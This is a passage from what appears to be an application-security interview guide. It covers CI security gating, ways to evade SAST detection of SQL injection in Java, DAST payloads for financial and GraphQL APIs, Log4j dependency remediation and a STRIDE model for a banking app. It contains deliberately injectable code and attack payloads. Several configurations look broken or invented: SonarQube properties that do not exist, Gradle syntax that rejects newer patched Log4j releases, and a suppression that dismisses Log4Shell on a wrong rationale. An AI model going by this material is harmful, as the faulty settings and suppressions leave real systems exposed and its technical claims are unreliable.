- ❌ Assuming all clients check algorithm specifications

**Evaluation Criteria:**
| Aspect | Excellent | Good | Weak |
|--------|-----------|------|------|
| **Riskiness** | Mentions dual-issuance + grace period | Mentions gradual rollout | Direct cutover |
| **Monitoring** | Real-time metrics + alerts + rollback triggers | Basic logging | No monitoring plan |
| **Scope** | Mobile, embedded, legacy, federated identity | Only backend services | Single scenario |
| **Complexity** | Discusses version negotiation, fallbacks | Linear timeline | Oversimplified |

---

### Question 1.3: Security Testing in Rapid Development (Velocity vs. Security Trade-off)

**Question:**
> Your team ships code 50+ times daily with aggressive feature deadlines. Security finding cycle time is 3+ weeks. How do you optimize the feedback loop to catch critical issues without becoming a bottleneck? Provide specific trade-off decisions.

**Ideal Answer Structure:**

**1. Risk-Based Prioritization Framework:**
```
CRITICAL (Immediate Gate):
  ✓ Hardcoded credentials/secrets → Auto-reject
  ✓ SQL injection, RCE patterns → Auto-reject
  ✓ Authentication bypass logic → Manual 2-hour review
  
HIGH (24-hour review):
  ✓ Broken access control patterns
  ✓ Insufficient logging/monitoring
  ✓ Weak cryptography
  
MEDIUM (48-72 hour review):
  ✓ Input validation gaps
  ✓ XSS/CSRF patterns
  ✓ Insecure deserialization
  
LOW (Batch review, sprint review):
  ✓ Code quality, maintainability
  ✓ Deprecation warnings
  ✓ Best practice deviations
```

**2. Static Analysis Optimization:**
```
SAST Pipeline Tuning:
├─ Pre-commit (local dev machine):
│  └─ Fast lightweight checks (100ms)
│     - Secrets detection (truffleHog)
│     - Basic injection patterns (regex)
│     - Dependency advisory (npm audit)
│
├─ Build Pipeline (CI):
│  └─ Medium-depth scans (2-3 min)
│     - SAST tool (SonarQube, Checkmarx) - critical rules only
│     - SCA with CVE scoring
│     - IaC scanning (Terraform/CloudFormation)
│
├─ PR Review Gate (lightweight):
│  └─ 5-minute scans for changed files only
│     - Delta-based analysis
│     - Legacy code excluded (gradual remediation)
│
└─ Nightly/Weekly (comprehensive):
    └─ Full codebase analysis (30+ min)
       - All rules enabled
       - Complex dataflow analysis
       - Architectural patterns
```

**3. Workflow Integration:**
```
Developer Flow:
├─ T0: Code commit with pre-commit hooks
│  └─ Secrets + basic patterns checked → 30 sec
│
├─ T1: PR creation
│  └─ Lightweight SAST triggered → Auto-comment in 5 min
│
├─ T2: Code review (peer + security team parallel)
│  └─ Security team focuses on HIGH+ findings only
│     Other findings filed as tech debt tickets
│
├─ T3: Automated tests + DAST (dev environment)
│  └─ Runtime validation + exploit proof
│
└─ T4: Deploy to prod
   └─ Re-confirmation of security assumptions
```

**4. Automation Hierarchy:**
| Finding Type | Tool | Response | SLA |
|--------------|------|----------|-----|
| Hardcoded AWS key | TruffleHog | Auto-reject PR | Real-time |
| Known CVE in dependency | Snyk/npm audit | Auto-alert | Real-time |
| SQL injection pattern | SonarQube + Semgrep | Auto-comment + fail if Critical | 2 min |
| Business logic bypass | Manual SAST | Comment request + 4-hour review | 4 hours |
| Code quality issue | Linters (ESLint/pylint) | Auto-comment, non-blocking | 1 min |

**5. False Positive Management:**
```yaml
# Tuning approach:
- Start with HIGH confidence rules only (95%+ precision)
- Whitelist common safe patterns (e.g., test data, hardcoded URLs)
- Tune False Positive Rate: Keep <5% for blocking findings
- Gradual rule enablement based on team training

# Metrics to track:
- Alert fatigue ratio (FP / TP)
- Developer dismissal rate → adjust alerting
- Time to remediation by severity
- Escaped vulnerabilities (post-deploy findings)
```

**6. Trade-off Decisions:**
```
DECISION 1: Legacy code handling
├─ Full scanning = 10,000 findings → overwhelm team
├─ Decision: Exclude legacy + scan only new/modified code
├─ Risk: Vulnerabilities in legacy code miss detection
└─ Mitigation: Category/component-based gradual remediation

DECISION 2: Synchronous vs. asynchronous blocking
├─ Sync SAST gate: Reliable, enforces policy, slows pipeline
├─ Async SAST: Non-blocking, fast pipeline, requires discipline
├─ Decision: Sync for CRITICAL, async for MEDIUM/LOW
└─ Metrics: Track post-deploy findings rates

DECISION 3: False positive tolerance
├─ Strict rules: Catch all patterns, high FP rate
├─ Lenient rules: Miss some bugs, low alert fatigue
├─ Decision: Tier rules by confidence, tune per team feedback
└─ Acceptance: Accept <2% of findings are false positives in exchange for speed

DECISION 4: Specialist review bandwidth
├─ All findings reviewed manually = 40 hours/week overhead
├─ Auto-remediate low-risk findings = Some risk acceptance
├─ Decision: Auto-fix obvious issues, route complex findings
└─ Risk: Some auto-fixed changes introduce risks (testing required)
```

**Follow-up Questions:**
1. How do you measure if this approach is "working"? What metrics matter?
2. What happens when a developer repeatedly ignores security findings?
3. How do you onboard new team members to this security-aware workflow?
4. Describe a time when this trade-off backfired. How did you recover?
5. How does this scale to teams of 50+ developers?

**Common Mistakes:**
- ❌ Trying to block all findings (kills velocity entirely)
- ❌ Pure automation without human judgment for business logic bugs
- ❌ Not tuning tools → high false positive rates → ignored findings
- ❌ Assuming security checks are "free" (they consume CPU/time)
- ❌ No feedback loop: "We fixed it" without learning why it happened

**Evaluation Rubric:**

| Capability | Excellent (9-10) | Good (7-8) | Adequate (5-6) | Weak (≤4) |
|------------|------------------|-----------|----------------|-----------|
| **Risk Prioritization** | Clear, data-driven tiers; explicitly risks accepted | Logical categories; vague trade-offs | Basic severity levels | Linear/no tiers |
| **Automation Architecture** | Distinct pre-commit/build/review gates; tool-specific tuning | Multiple gates; limited tuning | Single gate approach | Mentions "we automate" |
| **Trade-off Reasoning** | Acknowledges risks, mitigation plans, metrics | Describes decisions | Mentions speed vs. security | Avoids trade-offs |
| **Scalability** | Addresses 50+ devs + tool limits | Discusses team size | For "average teams" | Ignores scale |
| **False Positive Handling** | Tuning + metrics + dismissal strategy | Mentions FP problem | Acknowledges FPs exist | No mention |
| **Failure Recovery** | Post-deploy feedback, root cause, process update | Monitoring + alerts | Basic rollback | No plan |

---

## SECTION 2: SAST/DAST/SCA DEEP DIVE

### Question 2.1: SAST Tool Evasion & Detection Blind Spots

**Question:**
> You're pentesting a Java application protected by static analysis (SonarQube). Demonstrate 5 techniques to bypass SAST detection of SQL injection, and explain how to configure SonarQube to catch each bypass. What are the fundamental SAST limitations?

**Ideal Answer Structure:**

**Technique 1: Dynamic Query Construction (Multi-stage Concatenation)**
```java
// BYPASS ATTEMPT:
String table = getTableName(userInput);  // SAST loses track here
String col = getColumnName(userInput);    // External call = data flow break
String sql = "SELECT " + col + " FROM " + table;
stmt.execute(sql);

// SAST struggles: Path analysis across method boundaries without full context

// DETECTION FIX:
// 1. Enable "inter-procedural analysis" (resource-intensive)
// 2. Mark getTableName() with @Untrusted annotation
// 3. Use parameterized resolution tracking:
//    - Identify data sources: getTableName() is untrusted
//    - Propagate taint across string concatenation
```

**Technique 2: Encoding/Obfuscation Bypass**
```java
// BYPASS:
String encoded = Base64.encode(userInput);
String decoded = Base64.decode(encoded);
String sql = "SELECT * FROM users WHERE id=" + decoded;
stmt.execute(sql);

// SAST limitation: Encoding/decoding not tracked, treated as "clean" after transform

// DETECTION FIX:
// 1. Custom rule: Track Base64.decode() as untrusted source
// 2. Dataflow rule: Recognize encoding as obfuscation, not sanitization
// 3. Rule: str.decode() → re-taint dependency
```

**Technique 3: Reflection & Dynamic Code Loading**
```java
// BYPASS:
Class<?> cl = Class.forName("java.sql.Statement");
Method m = cl.getMethod("execute", String.class);
m.invoke(stmt, userInput);  // SAST can't track reflected execution

// SAST limitation: Reflection analysis is typically disabled (too many FP)

// DETECTION FIX:
// 1. Enable reflection tracking (heavier analysis)
// 2. Flag all reflect API calls as potential sinks
// 3. Require explicit approval for reflection usage
```

**Technique 4: Taint Masquerading (False Sanitization)**
```java
// BYPASS:
String sanitized = userInput.replace("'", "");  // INCOMPLETE sanitization
String sql = "SELECT * FROM users WHERE name='" + sanitized + "'";
// Attacker bypasses via: " OR "1"="1
// This bypasses single-quote filtering

// DETECTION FIX:
// 1. Rule: String.replace() detected but SQL-specific context not recognized
// 2. Parameterized queries are the only safe pattern
// 3. Configuration: Mark .replace() as INCOMPLETE_SANITIZATION warning, not FIX
```

**Technique 5: Stored Procedure + Injection (SAST assumes safety)**
```java
// BYPASS:
// Developers think stored procs are "safe" - but they're not if dynamic SQL inside
CallableStatement cs = conn.prepareCall("{ call buildQuery(?) }");
cs.setString(1, userInput);  // Safe at this layer...
cs.execute();
// But inside stored procedure:
// CREATE PROCEDURE buildQuery @user_input NVARCHAR(100)
// AS
// EXEC sp_executesql ('SELECT * FROM users WHERE id=' + @user_input)

// DETECTION FIX:
// 1. SAST can't analyze stored procs (different language, database layer)
// 2. Mitigation: Parameterize within stored procs
// 3. Integration with database analysis tools needed
```

**Fundamental SAST Limitations:**

| Limitation | Impact | Why It Exists |
|-----------|--------|---------------|
| **Inter-procedural Analysis** | External methods lose data flow context | Exponential path complexity |
| **Lateral File Analysis** | SQL injection in dependency not detected | False positives from library code |
| **Reflection/Dynamic Code** | Runtime code not analyzable | Turing-complete problem |
| **Control Flow Sensitivity** | Paths through conditionals may be missed | Path explosion problem |
| **Encoding Obfuscation** | Base64/compression treated as sanitization | Would need infinite transform rules |
| **Configuration/Environment** | Hard-coded vs. injected config not distinguished | Context-dependent analysis |
| **Business Logic Flaws** | Authorization bypass, race conditions missed | Lack semantic understanding |

**Configuration Deep Dive (SonarQube):**
```yaml
# sonar-project.properties
sonar.security.hotspots.review.priority=HIGH  # Focus on critical paths

# Enable aggressive rules (accept higher FP):
sonar.security.rules.enabled=SAST_MAXIMUM
sonar.security.rules.reflect=TRACK  # Track reflection
sonar.security.rules.encoding=FAIL   # Reject encoding as sanitization

# Custom rules:
- SQL_INJECTION_DYNAMIC_MULTI_STAGE: Detect concatenation across calls
- REFLECTION_EXECUTION: Flag all reflection API usage
- SANITIZATION_INCOMPLETE: Regex replacements != parameterization

# Disable low-value rules (reduce FP):
sonar.security.rules.excluded=CODE_QUALITY_ONLY
sonar.security.rules.legacy=IGNORE

# Integration:
sonar.security.database.integration=ENABLED  # Correlate with DB activity
sonar.security.correlation.log=ENABLED       # Link to runtime logs
```

**Follow-up Questions:**
1. What's the difference between a "false positive" and "incomplete sanitization"?
2. How would you catch the stored procedure injection without SAST?
3. Design a runtime monitor to catch these patterns at execution time.
4. Why does enabling all SAST rules make developers ignore findings?

**Common Mistakes:**
- ❌ Belief that SAST is exhaustive security (it's not)
- ❌ Enabling all rules → overwhelmed teams ignore findings
- ❌ Not understanding tool-specific blind spots
- ❌ Tuned rules too loose on data sources (misses taint)
- ❌ No correlation with dynamic testing (runtime validation)

---

### Question 2.2: DAST Strategy & API Security Testing

**Question:**
> Design a comprehensive DAST strategy for a GraphQL API + REST endpoints + WebSocket connections handling sensitive financial data. Address tool selection, custom payloads, false positive reduction, and production testing safety.

**Ideal Answer Structure:**

**1. DAST Tool Architecture:**
```
DAST Layers:
├─ Layer 1: API Reconnaissance
│  ├─ GraphQL Introspection crawling
│  ├─ OpenAPI/Swagger discovery
│  ├─ REST endpoint enumeration
│  └─ WebSocket endpoint detection
│
├─ Layer 2: Vulnerability Scanning
│  ├─ GraphQL-specific: Query complexity DoS, fragment attacks, batch operations
│  ├─ REST: Standard OWASP Top 10 (SQLi, XSS, XXE, etc.)
│  ├─ WebSocket: Deserialization attacks, protocol abuse
│  └─ Financial API-specific: Rate limiting bypass, transaction integrity
│
├─ Layer 3: Custom Payload Injection
│  ├─ Domain-specific payloads (financial transaction formats)
│  ├─ Mutation testing (intentional data corruption)
│  ├─ Fuzzing with corpus (real transaction shapes)
│  └─ Negative testing (invalid business logic)
│
├─ Layer 4: Behavioral Analysis
│  ├─ Response anomaly detection
│  ├─ Timing side-channel analysis
│  ├─ Information disclosure patterns
│  └─ Access control violations
│
└─ Layer 5: Post-Exploitation
   ├─ Data extraction verification
   ├─ Privilege escalation attempts
   ├─ Lateral movement detection
   └─ Clean-up & evidence collection
```

**2. Tool Selection & Rationale:**

| Layer | Tool | Why This Tool | Limitations |
|-------|------|---------------|-------------|
| **GraphQL** | GraphQL Cop / GraphQL Voyager + Burp Suite | Purpose-built for GraphQL mutation/query abuse | Can't understand business logic |
| **REST** | Burp Suite + OWASP ZAP | Industry standard, extensive payload library | Slow if not tuned, many FP |
| **WebSocket** | Burp Suite WebSocket plugin + wscat script | Manual WebSocket testing; custom message crafting | Limited automation |
| **Financial APIs** | Custom Python harness + pytest | Business-logic specific (transaction ordering, double-spend) | Requires domain expertise |
| **Rate Limiting** | Artillery / Locust | Load testing identifies quota bypass | Noisy production metrics |

**3. Payload Design for Financial APIs:**

```python
# Custom DAST payload library for financial transactions
PAYLOADS = {
    "DOUBLE_SPEND": [
        {"amount": 1000, "recipient": "attacker", "timestamp": <NOW>},
        {"amount": 1000, "recipient": "attacker", "timestamp": <NOW>},  # Replay
    ],
    
    "RACE_CONDITION": [
        # Submit same transaction twice rapidly before first committed
        # Exploit TOCTOU (Time-of-Check-Time-of-Use) windows
    ],
    
    "NEGATIVE_AMOUNT": [
        {"amount": -1000, "recipient": "victim"},  # Transfer -$1000 = gain $1000
    ],
    
    "AUTHORIZATION_BYPASS": [
        {"account_id": "victim", "amount": 1000},  # Access other's account
        {"role": "admin", "permission": "TRANSFER_LARGE_AMOUNTS"},  # Escalate
    ],
    
    "GRAPHQL_ABUSE": [
        # Query complexity DoS
        {
            "query": "query { user { transactions { amount { details { nested { deeply } } } } } }"
        },
        # Batch operation abuse (1000x simultaneous transfers)
        "query { transfer(...) transfer(...) ... [1000 times] }"
        
        # fragment cycles
        "fragment X on Transaction { nested: ...X }"
    ],
    
    "TIMING_ATTACKS": [
        # Measure response time to infer authorization logic
        # Fast success = path exists, even if access denied
    ]
}
```

**4. Environment Strategy:**

```
Test Environment Separation:
├─ DEV Environment (Unlimited testing)
│  └─ Full DAST, fuzzing, chaos testing, no holds barred
│
├─ STAGING (Controlled)
│  ├─ Production-like data (anonymized)
│  ├─ Replay-safe testing (idempotent operations)
│  ├─ Rate limiting disabled or raised
│  ├─ Monitoring alerts suppressed
│  └─ Cannot test financial transaction mutations (unsafe)
│
└─ PRODUCTION (Minimal, surgical)
    ├─ Read-only testing only
    ├─ GET/HEAD requests + safe OPTIONS
    ├─ No state mutations
    ├─ Separate "shadow account" for testing
    ├─ Monitored request rate (<1% of normal traffic)
    └─ Approval gate + change control
```

**5. False Positive Reduction:**

```yaml
FP Filtering Strategy:

Rule 1: Payload vs. Response Validation
└─ SQLi detected by pattern matching in payload echo
   └─ Verify actual SQL execution: Time-based inference or error-based confirmation
   └─ If pattern echoed but query executes normally → FP

Rule 2: Out-of-band Confirmation
└─ XXE detected by potential billion laughs payload
   └─ Verify OOB callback received (DNS, HTTP callback)
   └─ Request sent but no evidence of execution → FP

Rule 3: Business Logic Confirmation
└─ "Authorization bypass" flagged by unauthorized request
   └─ Verify data actually modified/accessed
   └─ 403 response is strong evidence of proper AC → likely FP

Rule 4: Transient/Environmental Conditions
└─ Timeout error interpreted as service unavailability
   └─ Retry with backoff; check service health separately
   └─ Single timeout ≠ vulnerability

FP Metrics:
├─ Track FP rate per finding type
├─ Investigate high FP rules (tune or disable)
├─ Correlate FP with false negatives (if we miss real bugs)
└─ Target: <10% FP rate for HIGH+ findings
```

**6. Custom Test Cases:**

```python
# Financial API - Custom DAST Test Cases

class FinancialTransactionTests:
    
    def test_transfer_amount_precision(self):
        """Verify floating-point handling doesn't leak precision"""
        response = transfer(from_account, to_account, amount=0.01)
        # Verify: amount deducted exactly, no fractional cent loss
        # Attack: Send 0.001 repeatedly, leak micro-transactions
        assert_precision_maintained()
    
    def test_concurrent_transfer_atomicity(self):
        """Race condition: simultaneous transfers from same account"""
        with concurrent.ThreadPoolExecutor() as executor:
            futures = [
                executor.submit(transfer, account, victim, 500),
                executor.submit(transfer, account, attacker, 500),
            ]
        # Verify: Only one succeeds if balance = 500
        # Attack: Both executed due to race condition
        assert_only_one_success()
    
    def test_graphql_query_complexity_limit(self):
        """DoS via deep query nesting"""
        deeply_nested_query = construct_nested_query(depth=500)
        response = graphql(query)
        # Verify: Query rejected with 429 or complexity exceeded
        # Attack: Server CPU exhausted, legitimate requests timeout
        assert_complexity_limit_enforced()
    
    def test_websocket_disconnect_idempotency(self):
        """Verify disconnect doesn't leave hanging transactions"""
        ws.send(transfer_command)
        ws.disconnect_abruptly()
        # Verify: Transaction not partially applied
        # Attack: Exploit inconsistent state during disconnect
        assert_state_consistent()

    def test_authorization_context_isolation(self):
        """Verify JWT/session token isolation"""
        token_a = login(user_a)
        token_b = login(user_b)
        # Use token_a, extract token_b from response
        response_a_with_b_token = transfer(from=user_a, token=token_b)
        # Verify: 401 Unauthorized
        # Attack: Authorization context mixup
        assert_token_isolation()
```

**7. DAST Vs SAST - Complementary Strengths:**

| Finding Type | DAST | SAST | Recommendation |
|--------------|------|------|-----------------|
| **SQL Injection (Clear)** | ✓ Runtime proof | ✓ Code pattern | Both - defense in depth |
| **OWASP Injection** | ✓ Behavioral | ✓ Path analysis | SAST faster, DAST proof |
| **Business Logic** | ✓ Sequences/races | ✗ Can't understand intent | DAST required |
| **Timing/Side-channel** | ✓ Observable behavior | ✗ Invisible in code | DAST only |
| **Race Conditions** | ✓ With fuzzing | ~ Static analysis limited | DAST + stress testing |
| **Authorization Bypass** | ✓✓ Behavioral test | ~ Configuration-dependent | DAST primary |

**Follow-up Questions:**
1. How do you safely fuzz GraphQL APIs in production without causing incidents?
2. Describe a false positive you've encountered and how you tuned it.
3. What's the DAST equivalent of a "0-day" that tools miss?
4. How do you test the DAST tool itself (does it have bugs)?

**Common Mistakes:**
- ❌ Running DAST only in Dev; missing production-specific issues
- ❌ Not disabling DAST alerts in test environments (crying wolf)
- ❌ Assuming DAST is comprehensive (missing business logic attacks)
- ❌ Too many false positives → findings ignored
- ❌ Not correlating DAST + SAST findings (missed compound vulnerabilities)

---

### Question 2.3: Software Composition Analysis (SCA) - Vulnerability Aggregation & Risk Scoring

**Question:**
> You discovered that Log4j 2.14.1 (current version deployed) has a critical RCE CVE. However, it's used transitively via 5 different parent dependencies with conflicting version requirements. Design your SCA strategy including: dependency tree analysis, version negotiation, false positive handling, and continuous monitoring post-remediation.

**Ideal Answer Structure:**

**1. Dependency Tree Analysis:**

```
Your App (log4j 2.14.1 required)
├─ spring-boot-starter-web (requires log4j >= 2.14)
│  └─ spring-core (depends on log4j 2.14.x)
├─ elasticsearch-client (requires log4j >= 2.13 for logging)
│  └─ transitive log4j 2.15.0 (CONFLICT!)
├─ apache-kafka-client (log4j >= 2.12)
│  └─ transitive log4j 2.16.0 (CONFLICT!)
├─ custom-logging-lib (exact: log4j 2.14.1)
├─ legacy-monitoring (old: log4j 2.7.0) ← SECURITY GAP
└─ slf4j-bridge (compatible with any log4j 2.x)
    └─ transitive log4j 2.10.0 (CONFLICT!)

ISSUE: Dependency resolver may choose ANY version 
       depending on Maven/Gradle version + resolution strategy

Actual Runtime Version: Determined at build time by dependency resolver
```

**2. SCA Tools & Limited Visibility:**

```yaml
Tool              | Detects Conflicts | Runtime Version | Policy Enforcement
------------------+------------------+------------------+-------------------
npm audit         | ✓ For npm         | ~ (package.json) | ✗ Weak
Snyk              | ✓ (paid plan)     | ✓ (some support) | ~ (configuration)
Sonatype Nexus    | ✓ Complex trees   | ✓ Best in class  | ✓ (governance)
OWASP Dependency  | ✓ Basic           | ✗ Estimates      | ✗ None
Check
JFrog/Artifactory | ✓ (detailed)      | ✓ (good)         | ✓ Policy gates
GitHub Dependabot | ✓ (GitHub)        | ✓ (inference)    | ~ (basic)
WhiteSource        | ✓ (enterprise)    | ✓ (best effort)  | ✓ (strong)
```

**3. SCA Configuration & Rules:**

```gradle
// gradle.build - Dependency management to control resolution

plugins {
    id 'java'
    id 'dependencyCheck'  // OWASP plugin
    id 'com.google.cloud.artifactregistry.gradle-plugin'  // Private repos
}

dependencies {
    // Force specific log4j version (resolve conflict)
    constraints {
        implementation('org.apache.logging.log4j:log4j-core') {
            version {
                require '2.17.0'  // Force safe version across all transitive deps
                reject '[2.0,2.17.0)', '[2.17.1,3.0]'  // Reject unsafe versions
            }
        }
    }
    
    // Explicit override
    dependencies {
        implementation 'org.apache.logging.log4j:log4j-core:2.17.0'
    }
}

// Dependency verification (lock file for reproducibility)
dependencyLock {
    lockAllConfigurations = true  // Track ALL versions
    ignoreFailures = false         // Fail on forbidden versions
    lockFile = 'gradle.lock'
}

// SCA Policy enforcement
dependencyCheck {
    nvdApiKey = credentials.nvd_api_key
    
    suppression = ['.suppression.xml']  // False positive configuration
    
    failBuildOnCVSS = 7.0  // Fail if CVE >= 7.0 severity
    
    // Dependency bundling (group related findings)
    dependencyBundling = [
        {
            matchOn = 'log4j-core'
            name = 'Apache Log4j'
            version = '2.17.0'
        }
    ]
    
    // Vendor corrections (CVE doesn't apply to our use case)
    vendorCorrectionsUrl = 'https://internal-db/corrections'
    
    // Report generation
    reportFormats = ['HTML', 'JSON', 'XML', 'SARIF']
}

tasks.register('verifySCA') {
    dependsOn dependencyCheckAnalyze
    
    doLast {
        File reportFile = file('build/dependency-check/report.json')
        def report = new JsonSlurper().parse(reportFile)
        
        // Custom suppression for known issues
        def suppressedCVEs = [
            'CVE-2021-44228': 'Not using JMSAppender',  // Log4Shell but we don't use JMS
            'CVE-2021-45046': 'Version 2.17.0 patches', // Fixed in our version
        ]
        
        report.vulnerabilities.each { vuln ->
            if (suppressedCVEs.containsKey(vuln.source)) {
                println "⚠️  Suppressed: ${vuln.source} (${suppressedCVEs[vuln.source]})"
            } else if (vuln.severity >= 'HIGH') {
                throw new GradleException("FAILED SCA: ${vuln.source} - ${vuln.description}")
            }
        }
    }
}
```

**4. Version Negotiation Strategy:**

```
Step 1: Identify all log4j versions in dependency tree
  → Spring Boot: 2.14.1
  → Elasticsearch: 2.15.0
  → Kafka: 2.16.0
  → Legacy: 2.7.0
  
Step 2: Find safe version satisfying all constraints
  Target: >= 2.17.0 (all known RCEs patched)
  
  Check if each parent accepts upgrade:
  ├─ Spring Boot (2.14.x required)
    └─ Can we upgrade Spring Boot? (YES → spring-boot-2.6+)
  ├─ Elasticsearch (2.13+)
    └─ Elasticsearch-client version upgrade needed
  ├─ Kafka (2.12+)
    └─ kafka-clients-3.0+ supports log4j 2.17.0
  ├─ Legacy (exact 2.7.0)
    └─ BLOCKER - Cannot upgrade without legacy code changes
  └─ slf4j-bridge (any 2.x)
    └─ Compatible

Step 3: Dependency chain update plan
  Phase 1: Upgrade unconstrained deps
    ├─ elasticsearch-client → 7.15+ (requires 2.15+)
    ├─ spring-boot → 2.6.x (requires 2.14+)
    └─ kafka-clients → 3.1+ (supports 2.17+)
  
  Phase 2: Refactor legacy dependency
    ├─ Option A: Update legacy-monitoring library
    ├─ Option B: Isolate in separate classloader
    ├─ Option C: Remove if unused
    └─ Decision: Option A (1.5 day effort)
  
  Phase 3: Force dependency convergence
    └─ gradle.build constraint: log4j 2.17.0

Step 4: Validation
  ├─ Build on Java 8, 11, 17 (compatibility matrix)
  ├─ Integration tests with real Elasticsearch/Kafka
  ├─ Runtime dependency check: classpath contains ONLY 2.17.0
  └─ No silent fallback to old version

Step 5: Rollout
  ├─ Dev environment (1 day)
  ├─ Staging (2 days, monitor for compatibility issues)
  ├─ Gradual production rollout (5% → 25% → 100%)
  └─ Monitor: ClassNotFoundException, version conflicts
```

**5. Runtime Verification:**

```java
// Verify deployed version - add to health check
@Component
public class DependencyHealthCheck {
    
    @PostConstruct
    public void verifyCriticalDependencies() {
        String log4jVersion = VersionFinder.findVersion("log4j-core");
        
        if (log4jVersion.startsWith("2.") && 
            !isVersionOrNewer(log4jVersion, "2.17.0")) {
            throw new StartupException(
                "CRITICAL: Deployed with vulnerable log4j: " + log4jVersion
            );
        }
        
        logger.info("Log4j version verified: " + log4jVersion);
    }
    
    // Health endpoint reveals versions
    @GetMapping("/health")
    public HealthResponse health() {
        return new HealthResponse(
            status = "UP",
            dependencies = {
                "log4j": System.getProperty("log4j.version"),
                "spring-core": getVersion(SpringCore.class),
                "elasticsearch": getVersion(RestClient.class)
            }
        );
    }
    
    // Metrics for monitoring
    @Gauge(name = "dependency.version.mismatch")
    public int dependencyMismatches() {
        // Count classes loaded from unexpected JAR versions
        return detectClassLoaderAnomalies();
    }
}
```

**6. False Positive Suppression Template:**

```xml
<!-- suppression.xml - Manage SCA noise -->
<suppressions>
    <!-- CVE doesn't apply to our use case -->
    <suppress>
        <notes>Log4Shell (CVE-2021-44228): We don't use JMSAppender or JNDI lookup</notes>
        <cve>CVE-2021-44228</cve>
        <reason>Use Case Changed</reason>
        <expires>2026-12-31</expires>
        <ticket>TICKET-1234</ticket>
    </suppress>
    
    <!-- Transitive dependency, pinned to safe version -->
    <suppress>
        <notes>commons-collections 3.2.1: Deserialization only in test code</notes>
        <sha1>f61d66ca93628b0f4f0a5b62a0d3ba4a5c9e5d2c</sha1>
        <reason>Safe Use Case / Component Vulnerable At Runtime Only</reason>
    </suppress>
    
    <!-- False positive: Not vulnerable in our configuration -->
    <suppress>
        <notes>junit 4.12: Test-only dependency, not in production classpath</notes>
        <cve>CVE-2020-1234</cve>
        <reason>Component Affects Component Only / Software Limitation</reason>
        <scope>test</scope>
    </suppress>
</suppressions>
```

**7. Continuous Monitoring Post-Remediation:**

```yaml
Monitoring Strategy:

┌─ SCA Scan Frequency
│  ├─ Daily automated scan (dev builds)
│  ├─ Real-time Snyk monitoring (new vulns alert)
│  ├─ Weekly production runtime check
│  └─ Monthly deep audit (transitive deps)
│
├─ Metrics
│  ├─ Total vulnerabilities (trend)
│  ├─ Critical/High % (must be <5%)
│  ├─ Mean Time To Remediate (MTTR)
│  ├─ Suppression ratio (track unused suppressions)
│  └─ Version drift (unintended downgrades)
│
├─ Alerts
│  ├─ NEW critical CVE in active dependency → Slack + Jira ticket
│  ├─ SCA scan baseline exceeded → Auto-investigate
│  ├─ Suspicious version downgrade → Block deployment
│  └─ Suppression expired → Re-evaluate
│
└─ Enforcement
   ├─ Fail CI/CD if new critical vulnerability introduced
   ├─ Blocking gate on dependency version downgrades
   ├─ Require security sign-off for suppressions >30 days old
   └─ Annual re-audit of all transitive dependencies
```

**Follow-up Questions:**
1. How do you detect "silent" dependency downgrades (e.g., CI cache issue)?
2. What's your process for "we can't update this parent dependency"?
3. Describe a scenario where SCA missed a vulnerability.
4. How do you handle open-source dependencies with no maintainer?

**Common Mistakes:**
- ❌ Suppressing findings without documented rationale
- ❌ Not enforcing dependency resolution (trusting resolver)
- ❌ Only scanning production builds (missing dev-only issues)
- ❌ Ignoring transitive vulnerabilities (focus on direct only)
- ❌ No monitoring after remediation (vulnerability re-introduced)

---

## SECTION 3: THREAT MODELING & RISK ANALYSIS

### Question 3.1: STRIDE Threat Modeling - Advanced Session

**Question:**
> Conduct a STRIDE threat model for a mobile banking app with end-to-end encrypted messaging between client and backend, certificate pinning, and biometric authentication. Identify 10+ threats across all STRIDE categories, prioritize them using CVSS + business impact, and design mitigations. Include threats that existing tools miss.

**Ideal Answer Structure:**

**STRIDE Framework Recap:**
- **S**poofing: Attacking identity (authentication)
- **T**ampering: Modifying data/logic (integrity)
- **R**epudiation: Denying actions (non-repudiation, logging)
- **I**nformation Disclosure: Unauthorized data access
- **D**enial of Service: Service unavailability
- **E**levation of Privilege: Gaining unauthorized permissions

**Mobile Banking App Components:**
```
┌─────────────────┐
│  Mobile App     │  (Biometric Auth, Encryption)
│  ├─ Keystore    │  
│  ├─ Messaging   │  (E2E Encrypted)
│  └─ UI          │  
└────────┬────────┘
         │ HTTPS + Pinning
         │ E2E Encryption
         ▼
┌─────────────────┐        ┌──────────────┐
│  API Gateway    │◄──────►│ Certificate  │
│  ├─ Auth        │        │ Authority    │
│  ├─ Crypto      │        └──────────────┘
│  └─ Validation  │
└────────┬────────┘        ┌──────────────┐
         │                 │ Backend Crypto│
         ▼                 │ ├─ Key Mgmt   │
┌─────────────────┐        │ ├─ Verification
│  Backend        │◄──────►│ └─ Nonce/Replay
│  ├─ Auth DB     │        └──────────────┘
│  ├─ Ledger      │
│  └─ Crypto      │
└─────────────────┘
```

**STRIDE Threat Analysis:**

**SPOOFING (Identity)**

| Threat # | Threat | CVSS Score | Business Impact | Existing Detection | Mitigation |
|----------|--------|-----------|-----------------|-------------------|------------|
| **S1** | Replay attack: Attacker captures encrypted message, replays it | 6.8 | Duplicate transactions | ❌ E2E encryption doesn't prevent | Nonce + timestamp validation; message ordering |
| **S2** | Biometric bypass via cached/reused token | 7.5 | Account takeover | ⚠️ Not in typical security testing | Token tied to session; regenerate post-unlock |
| **S3** | Certificate pinning bypassed via MITM during app update | 7.2 | Full HTTPS compromise | ⚠️ Only detected if testing with pinning | Pin backup certificates; pinning validation in code |
| **S4** | Compromised device key (encrypted storage) | 8.5 | All transactions compromised | ❌ Hardware-dependent; not testable | Hardware-backed keystore requirement; alert on key access |
| **S5** | API token exfiltration via app memory | 7.0 | Session hijacking | ~ Manual binary analysis | Token encryption in memory; clear after use |

**TAMPERING (Integrity)**

| Threat # | Threat | CVSS | Impact | Detection | Mitigation |
|----------|--------|------|--------|-----------|------------|
| **T1** | Transaction amount modified in transit (bypass E2E?) | 9.1 | Financial loss | ~ Only if E2E broken | Message Authentication Code (MAC) on amount |
| **T2** | App binary modified (jailbreak/root + APK repackaging) | 7.8 | Persistent backdoor | ~ Code integrity checking in app | Certificate pinning + binary signature verification |
| **T3** | Database record tampering (compromised backend) | 8.9 | Ledger corruption | ⚠️ Audit logs miss modifications | Immutable ledger; cryptographic hash chain |
| **T4** | Man-in-the-Mobile: Local HTTP proxy intercepts (Burp) | 7.5 | Plaintext exposure of headers | ❌ SSL pinning not tested locally | Anti-debugging, root detection, proxy detection |
| **T5** | Stored credential tampering (SharedPreferences plaintext) | 8.2 | Account compromise | ~ Manual code review | Encrypted preferences; TEE-backed storage |

**REPUDIATION (Non-Repudiation)**

